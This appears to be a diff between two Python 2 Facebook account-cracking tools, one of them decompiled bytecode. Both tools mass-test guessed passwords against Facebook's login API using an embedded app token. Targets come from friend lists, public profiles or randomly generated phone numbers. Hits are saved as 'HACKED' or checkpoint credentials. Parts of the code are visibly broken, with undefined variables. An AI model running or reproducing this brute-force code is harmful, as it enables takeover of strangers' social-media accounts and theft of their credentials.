@@ -1,800 +1,367 @@
-# -*- coding: utf-8
-# coded by Mr. NIKI
-# fb.me/Niki.Cyber404
-# instagram.com/niki.cyber404
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 
+# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
+# Embedded file name: koNtol
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+for n in range(1000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
 
 try:
-	import requests
-	import sys
-	import os
-	import subprocess
-	import random
-	import time
-	import re
-	import json
-	from multiprocessing.pool import ThreadPool
-	from requests.exceptions import ConnectionError
-	from datetime import datetime
-except Exception as modul:
-	print(" \033[0;97m[\033[0;91m!\033[0;97m] %s installed yet"%(modul))
-	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")
+    import requests
+except ImportError:
+    os.system('pip2 install mechanize')
 
-loop = 0
-ok = []
-cp = []
-id = []
-pwx = []
-
-s = requests.Session()
-rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
-ua = s.get("https://anggaxd.herokuapp.com/ua.txt").text.strip()
-ip = s.get('https://anggaxd.herokuapp.com/ip/').text
-	
-ct = datetime.now()
-n = ct.month
-bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
 try:
-    if n < 0 or n > 12:
-        exit()
-    nTemp = n - 1
-except ValueError:
-    exit()
+    import mechanize
+except ImportError:
+    os.system('pip2 install requests')
+    time.sleep(1)
+    os.system('Then type: python2 H4SN4T.py')
 
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-op = bulan[nTemp]
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
-def logo():
-	os.system("clear")
-	print("  \033[0;92m_   _ _____ _  _______")
-	print("  \033[0;92m| \ | |_   _| |/ /_   _|")
-	print("  \033[0;92m|  \| | | | | ' /  | | ")
-	print("  \033[0;92m| . ` | | | |  <   | | ")
-	print("  \033[0;92m| |\  |_| |_| . \ _| |_")
-	print("  \033[0;92m|_| \_|_____|_|\_\_____|")
-	print("           ")
-	
-	
-        print("  \033[0;92m---------------------------------------------")
-        print("  \033[0;92mAUTHOR   :NIKI HACKER")
-        print("  \033[0;92mFACEBOOK :Niki.Cyber404")
-        print("  \033[0;92mYOUTUBE  :JAMES NIKI")
-        print("  \033[0;92mTELEGRAM :@niki_cyber404")
-        print("  \033[0;92mGITHUB   :Niki-Cyber404")
-        print("  \033[0;92m---------------------------------------------")
-    
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(3.0 / 200)
+
+
 def tik():
-	titik = [".   ","..  ","... "]
-	for o in titik:
-		print("\r[●] Loging In "+o),;sys.stdout.flush();time.sleep(1)
+    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
+    for o in titik:
+        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;97mWait Few Minutes \x1b[1;97m' + o,
+        sys.stdout.flush()
+        time.sleep(0.5)
 
 
 back = 0
-successful = []
-cpb = []
 oks = []
 id = []
+cpb = []
+vulnot = '\x1b[31mNot Vuln'
+vuln = '\x1b[32mVuln'
+os.system('clear')
+logo1 = """
+Hello"""
+def lisensi():
+    os.system('clear')
+    login()
 
-def token():
-	os.system('clear')
-	print logo
-	toket = raw_input("Token : ")
-	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
-		a = json.loads(otw.text)
-		nama = a['name']
-		zedd = open("/sdcard/Android/data/com.termux/token.log", 'w')
-		zedd.write(toket)
-		zedd.close()
-		print '\033[0;92m√ Login Facebook Account'
-		menu()
-	except KeyError:
-		print '\033[1;91m! Token Login '
-		time.sleep(1.7)
-		masuk()
-	except requests.exceptions.SSLError:
-		print '! W31C0M3'
-		exit()
-    
-def menu():
-	os.system('clear')
-	try:
-		time.sleep(0)
-		print 'OHHH Bhai'
-		
-	except:
-		print "\33[1;91mapi key not available"
-		time.sleep(1)
-		exit()
-	try:
-		otw = requests.get('https://graph.facebook.com/me/?access_token=+toket')
-		a = json.loads(otw.text)
-		nama = a['name']
-		id = a['id']
-		t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
-		b = json.loads(t.text)
-		sub = str(b['summary']['total_count'])
-	except KeyError:
-		os.system('clear')
-		print '\33[1;91mtokens not available'
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		niki()
-	except requests.exceptions.ConnectionError:
-		print 'No connection'
-		keluar()
-	os.system("clear")
-	print(logo)
-	print("email   : "+n)
-	print("key      : "+f)
-	print("[✓] Name : "+name)
-	print("[✓] ID   : "+id)
-	print (50*"-")
-	print
-	print ("[1] Crack Menu")
-	print ("[2] Crack With Pass Choice")
-	print ("[3] Grab Emails")
-	print ("[4] Grab Mobile Numbers")
-	print ("[5] Unfriend with one click")
-	print ("[6] Update BXI Tool")
-	print ("[7] Follow Me On Facebook")
-	print ("[8] Log Out")
-	print ("[0] Exit            ")
-	print (50*"-")
-	action()
+
+def login():
+    os.system('clear')
+    print logo1
+    print
+    print '\x1b[1;92m(1) Pakistan Cloning'
+    print '\x1b[1;92m(2) Bangladesh Cloning'
+    print '\x1b[1;97m(0) Back'
+    pilih_Somi()
+
+
+def pilih_Somi():
+    Somi = raw_input('\n\x1b[1;92m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
+    if Somi == '':
+        print '\x1b[1;92mFill In Correctly'
+        pilih_login()
+    elif Somi == '1':
+        p()
+    elif Somi == '2':
+        b()
+
+
+def p():
+    os.system('clear')
+    print logo1
+    print
+    print
+    print 'Do you want countinue [y/n]'
+    act()
+
+
+def act():
+    somi = raw_input('\n\n \x1b[1;92m  ')
+    if somi == '':
+        print '[!] Fill in correctly'
+        act()
+    elif somi == 'y':
+        tik()
+        os.system('clear')
+        print logo1
+        print
+        print '\x1b[1;96mSELECT YOUR NETWORK CODE'
+        print '\x1b[1;92m00,01,02,03,04,05,06,07,08,09'
+        print '\x1b[1;92m11,12,13,14,15,16,17,18'
+        print '\x1b[1;92m21,22,23,24'
+        print '\x1b[1;92m30,31,32,33,34,35,36'
+        print '\x1b[1;92m40,41,42,43,44,45,46,47,48,49'
+        print
+        try:
+            c = raw_input('>>> ')
+            k = '03'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            somi()
+
+    elif somi == 'n':
+        login()
+    else:
+        print '[!] Fill In Correctly'
+        action()
+    print 47 * '\x1b[1;93m-'
+    xxx = str(len(id))
+    jalan('\x1b[1;92m TOTAL IDS NUMBER : ' + xxx)
+    jalan('\x1b[1;92m TO STOP THIS PROCESS PRESS Ctrl THEN z')
+    print 47 * '\x1b[1;94m-'
+
+    def main(arg):
+        global cpb
+        global oks
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
+                okb = open('sdcard/ids/successful.txt', 'a')
+                okb.write(k + c + user + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;92m   (NIKI-\x1b[1;96mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
+                cps = open('sdcard/ids/checkpoint.txt', 'a')
+                cps.write(k + c + user + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+            else:
+                pass2 = k + c + user
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
+                    okb = open('sdcard/ids/successful.txt', 'a')
+                    okb.write(k + c + user + pass2 + '\n')
+                    okb.close()
+                    oks.append(c + user + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;92m   (NIKI-\x1b[1;96mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
+                    cps = open('sdcard/ids/checkpoint.txt', 'a')
+                    cps.write(k + c + user + pass3 + '\n')
+                    cps.close()
+                    cpb.append(c + user + pass3)
+                else:
+                    pass3 = 'Pakistan'
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
+                        okb = open('sdcard/ids/successful.txt', 'a')
+                        okb.write(k + c + user + pass3 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;92m   (NIKI-\x1b[1;96mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
+                        cps = open('sdcard/ids/checkpoint.txt', 'a')
+                        cps.write(k + c + user + pass3 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass3)
+                    else:
+                        pass4 = '123456'
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;92m   (HAC\x1b[1;92mKED)\x1b[1;92m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass4
+                            okb = open('sdcard/ids/successful.txt', 'a')
+                            okb.write(k + c + user + pass4 + '\n')
+                            okb.close()
+                            oks.append(c + user + pass4)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;96m   (NIKI-\x1b[1;96mCP\x1b[1;96m)\x1b[1;96m \xe2\x97\x8f \x1b[1;96m' + k + c + user + '\x1b[1;96m \xe2\x97\x8f \x1b[1;96m ' + pass4
+                            cps = open('sdcard/ids/checkpoint.txt', 'a')
+                            cps.write(k + c + user + pass4 + '\n')
+                            cps.close()
+                            cpb.append(c + user + pass4)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50 * '\x1b[1;91m-'
+    print 'Process Has Been Completed ...'
+    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
+    login()
+
+
+def b():
+    os.system('clear')
+    print logo1
+    print
+    print
+    print 'Do you want countinue [y/n]'
+    action()
 
 
 def action():
-	chb = raw_input("\n  ▄︻̷̿┻̿═━一   ")
-	if chb =="":
-		print ("[!] Fill in correctly")
-		action()
-	elif chb =="1":
-	    crack_menu()
-	elif chb =="2":
-		choice_menu()
-	elif chb =="3":
-	    cb()
-	    gbmail()
-	elif chb =="4":
-	    gbnmbr()
-	elif chb =="5":
-	    unfriend()
-	elif chb =="6":
-	    os.system("pip2 install --upgrade bxin")
-	    cb()
-	    print (logo)
-	    psb("100%")
-	    
-	    
-	elif chb =="7":
-	    os.system("xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl")
-	    time.sleep(1)
-	    menu()
-	elif chb =="8":
-	    os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
-	    print
-	    psb(" Logout successfully")
-	elif chb =="0":
-		exb()
-	else:
-		print ("[!] Fill in correctly")
-		action()
-
-
-def crack_menu():
-	global toket
-	os.system("clear")
-	try:
-		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
-	except IOError:
-		print("[!] Token invalid")
-		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
-		time.sleep(1)
-		token()
-	print (logo)
-	print ("[1] Crack From Friend List")
-	print ("[2] Crack From Any Public ID")
-	print ("[3] Crack From File")
-	print ("[0] Back")
-	print (50*"-")
-	crack_action()
-
-def crack_action():
-	bch = raw_input("\n  ▄︻̷̿┻̿═━一   ")
-	if bch =="":
-		print ("[!] Fill in correctly")
-		crack_action()
-	elif bch =="1":
-		os.system("clear")
-		print (logo)
-		r = session.get("https://graph.facebook.com/me/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for s in z["data"]:
-			id.append(s["id"])
-	elif bch =="2":
-		os.system("clear")
-		print (logo)
-		idt = raw_input("[✓] Enter ID : ")
-		os.system("clear")
-		print (logo)
-		try:
-			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			psb("[✓] Account  Name: "+op["name"])
-			time.sleep(0.5)
-		except KeyError:
-			print("[!] ID Not Found!")
-			raw_input("\n[Back]")
-			crack_menu()
-		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			id.append(i["id"])
-	elif bch =="3":
-		os.system("clear")
-		print (logo)
-		try:
-			idlist = raw_input("[✓] Enter File Path  : ")
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print ("[!] File Not Found")
-			raw_input("\n[ Back ]")
-			crack_menu()
-	elif bch =="0":
-		menu()
-	else:
-		print ("[!] Fill in correctly")
-		crack_action()
-	xxx = str(len(id))
-	psb ("[✓] Total Friends: "+xxx)
-	time.sleep(0.5)
-	psb ("[✓] Please wait, process is running ...")
-	time.sleep(0.5)
-	psb ("[!] To Stop Process Press CTRL Then Press z")
-	time.sleep(0.5)
-	print (50*"-")
-	print
-	
-			
-	def main(arg):
-		global cpb,oks
-		user = arg
-		try:
-			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
-			b = json.loads(a.text)
-			d=b["first_name"]
-			e=d.replace(" ", "")
-			f=e.lower()
-			g=pf(f, 1)
-			h=g.upper()
-			i=rf(f, 1)
-			c=h+i
-			pass1="786786"
-			data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-			q = json.load(data)
-			if "access_token" in q:
-				print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass1
-				oks.append(user+pass1)
-			else:
-				if "www.facebook.com" in q["error_msg"]:
-					print "[Checkpoint] " + user + " | " + pass1
-					cps = open("checkpoint.txt", "a")
-					cps.write(user+"|"+pass1+"\n")
-					cps.close()
-					cpb.append(user+pass1)
-				else:
-					pass2 = c+"@@@786"
-					data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-					q = json.load(data)
-					if "access_token" in q:
-						print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass2
-						oks.append(user+pass2)
-					else:
-						if "www.facebook.com" in q["error_msg"]:
-							print "[Checkpoint] " + user + " | " + pass2
-							cps = open("checkpoint.txt", "a")
-							cps.write(user+"|"+pass2+"\n")
-							cps.close()
-							cpb.append(user+pass2)
-						else:
-							pass3 = c + "102030"
-							data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-							q = json.load(data)
-							if "access_token" in q:
-								print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass3
-								oks.append(user+pass3)
-							else:
-								if "www.facebook.com" in q["error_msg"]:
-									print "[Checkpoint] " + user + " | " + pass3
-									cps = open("checkpoint.txt", "a")
-									cps.write(user+"|"+pass3+"\n")
-									cps.close()
-									cpb.append(user+pass3)
-								else:
-									pass4 = "223344"
-									data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-									q = json.load(data)
-									if "access_token" in q:
-										print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass4
-										oks.append(user+pass4)
-									else:
-										if "www.facebook.com" in q["error_msg"]:
-											print "[Checkpoint] " + user + " | " + pass4
-											cps = open("checkpoint.txt", "a")
-											cps.write(user+"|"+pass4+"\n")
-											cps.close()
-											cpb.append(user+pass4)
-										else:
-											pass5 = c + "786"
-											data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-											q = json.load(data)
-											if "access_token" in q:
-												print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass5
-												oks.append(user+pass5)
-											else:
-												if "www.facebook.com" in q["error_msg"]:
-													print "[Checkpoint] " + user + " | " + pass5
-													cps = open("checkpoint.txt", "a")
-													cps.write(user+"|"+pass5+"\n")
-													cps.close()
-													cpb.append(user+pass5)
-												else:
-													pass6 = "123456"
-													data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-													q = json.load(data)
-													if "access_token" in q:
-														print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass6
-														oks.append(user+pass6)
-													else:
-														if "www.facebook.com" in q["error_msg"]:
-															print "[Checkpoint] " + user + " | " + pass6
-															cps = open("checkpoint.txt", "a")
-															cps.write(user+"|"+pass6+"\n")
-															cps.close()
-															cpb.append(user+pass6)
-														else:
-															pass7 = c + "112233"
-															data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-															q = json.load(data)
-															if "access_token" in q:
-																print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass7
-																oks.append(user+pass7)
-															else:
-																if "www.facebook.com" in q["error_msg"]:
-																	print "[Checkpoint] " + user + " | " + pass7
-																	cps = open("checkpoint.txt", "a")
-																	cps.write(user+"|"+pass7+"\n")
-																	cps.close()
-																	cpb.append(user+pass7)
-																	
-		except:
-			pass
-			
-	p = ThreadPool(30)
-	p.map(main, id)
-	print (50*"-")
-	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
-	print ("[✓] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb)))
-	print("[✓] CP File Has Been Saved : checkpoint.txt")
-	raw_input("\n[Back]")
-	if xxx == "0":
-		crack_menu()
-	else:
-		os.system("python2 .README.md")
-
-def choice_menu():
-	global toket
-	os.system("clear")
-	try:
-		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
-	except IOError:
-		print("[!] Token invalid")
-		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
-		time.sleep(1)
-		token()
-	os.system("clear")
-	print (logo)
-	print ("[1] Crack From Friend List")
-	print ("[2] Crack From Any Public ID")
-	print ("[3] Crack From File")
-	print ("[0] Back")
-	print (50*"-")
-	choice_action()
-
-def choice_action():
-	bch = raw_input("\n  ▄︻̷̿┻̿═━一   ")
-	if bch =="":
-		print ("[!] Fill in correctly")
-		choice_action()
-	elif bch =="1":
-		os.system("clear")
-		print (logo)
-		pass1=raw_input(" Put Password No 1 : ")
-		pass2=raw_input(" Put Password No 2 : ")
-		pass3=raw_input(" Put Password No 3 : ")
-		pass4=raw_input(" Put Password No 4 : ")
-		pass5=raw_input(" Put Password No 5 : ")
-		pass6=raw_input(" Put Password No 6 : ")
-		pass7=raw_input(" Put Password No 7 : ")
-		r = session.get("https://graph.facebook.com/me/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for s in z["data"]:
-			id.append(s["id"])
-	elif bch =="2":
-		os.system("clear")
-		print (logo)
-		idt = raw_input("[✓] Enter ID : ")
-		pass1=raw_input(" Put Password No 1 : ")
-		pass2=raw_input(" Put Password No 2 : ")
-		pass3=raw_input(" Put Password No 3 : ")
-		pass4=raw_input(" Put Password No 4 : ")
-		pass5=raw_input(" Put Password No 5 : ")
-		pass6=raw_input(" Put Password No 6 : ")
-		pass7=raw_input(" Put Password No 7 : ")
-		os.system("clear")
-		print (logo)
-		try:
-			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			psb("[✓] Account  Name: "+op["name"])
-			time.sleep(0.5)
-		except KeyError:
-			print("[!] ID Not Found!")
-			raw_input("\n[Back]")
-			choice_menu()
-		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			id.append(i["id"])
-	elif bch =="3":
-		os.system("clear")
-		print (logo)
-		try:
-			idlist = raw_input("[✓] Enter File Path  : ")
-			pass1=raw_input(" Put Password No 1 : ")
-			pass2=raw_input(" Put Password No 2 : ")
-			pass3=raw_input(" Put Password No 3 : ")
-			pass4=raw_input(" Put Password No 4 : ")
-			pass5=raw_input(" Put Password No 5 : ")
-			pass6=raw_input(" Put Password No 6 : ")
-			pass7=raw_input(" Put Password No 7 : ")
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print ("[!] File Not Found")
-			raw_input("\n[ Back ]")
-			choice_menu()
-	elif bch =="0":
-		menu()
-	else:
-		print ("[!] Fill in correctly")
-		choice_action()
-	xxx = str(len(id))
-	psb ("[✓] Total Friends: "+xxx)
-	time.sleep(0.5)
-	psb ("[✓] Please wait, process is running ...")
-	time.sleep(0.5)
-	psb ("[!] To Stop Process Press CTRL Then Press z")
-	time.sleep(0.5)
-	print (50*"-")
-	print
-	
-			
-	def main(arg):
-		global cpb,oks
-		user = arg
-		try:
-			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
-			b = json.loads(a.text)
-		except OSError:
-			pass
-		try:
-			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
-			b = json.loads(a.text)
-			data1 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-			q1 = json.loads(data1.text)
-			if "access_token" in q1:
-				print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass1
-				oks.append(user+pass1)
-			else:
-				if "www.facebook.com" in q1["error_msg"]:
-					print "[Zalim Cp] " + user + " | " + pass1
-					cps = open("checkpoint.txt", "a")
-					cps.write(user+"|"+pass1+"\n")
-					cps.close()
-					cpb.append(user+pass1)
-				else:
-					data2 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-					q2 = json.loads(data2.text)
-					if "access_token" in q2:
-						print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass2
-						oks.append(user+pass2)
-					else:
-						if "www.facebook.com" in q2["error_msg"]:
-							print "[Zalim Cp] " + user + " | " + pass2
-							cps = open("checkpoint.txt", "a")
-							cps.write(user+"|"+pass2+"\n")
-							cps.close()
-							cpb.append(user+pass2)
-						else:
-							data3 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-							q3 = json.loads(data3.text)
-							if "access_token" in q3:
-								print "\x1b[1;95m[Zalim Hack]\x1b[0m " + user + " | " + pass3
-								oks.append(user+pass3)
-							else:
-								if "www.facebook.com" in q3["error_msg"]:
-									print "[Zalim Cp] " + user + " | " + pass3
-									cps = open("checkpoint.txt", "a")
-									cps.write(user+"|"+pass3+"\n")
-									cps.close()
-									cpb.append(user+pass3)
-								else:
-									data4 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-									q4 = json.loads(data4.text)
-									if "access_token" in q4:
-										print "\x1b[1;94m[Zalim Hack]\x1b[0m " + user + " | " + pass4
-										oks.append(user+pass4)
-									else:
-										if "www.facebook.com" in q4["error_msg"]:
-											print "[Zalim Cp] " + user + " | " + pass4
-											cps = open("checkpoint.txt", "a")
-											cps.write(user+"|"+pass4+"\n")
-											cps.close()
-											cpb.append(user+pass4)
-										else:
-											data5 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-											q5 = json.loads(data5.text)
-											if "access_token" in q5:
-												print "\x1b[1;93m[Zalim Hack]\x1b[0m " + user + " | " + pass5
-												oks.append(user+pass5)
-											else:
-												if "www.facebook.com" in q5["error_msg"]:
-													print "[Zalim Cp] " + user + " | " + pass5
-													cps = open("checkpoint.txt", "a")
-													cps.write(user+"|"+pass5+"\n")
-													cps.close()
-													cpb.append(user+pass5)
-												else:
-													data6 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-													q6 = json.loads(data6.text)
-													if "access_token" in q6:
-														print "\x1b[1;97m[Zalim Hack]\x1b[0m " + user + " | " + pass6
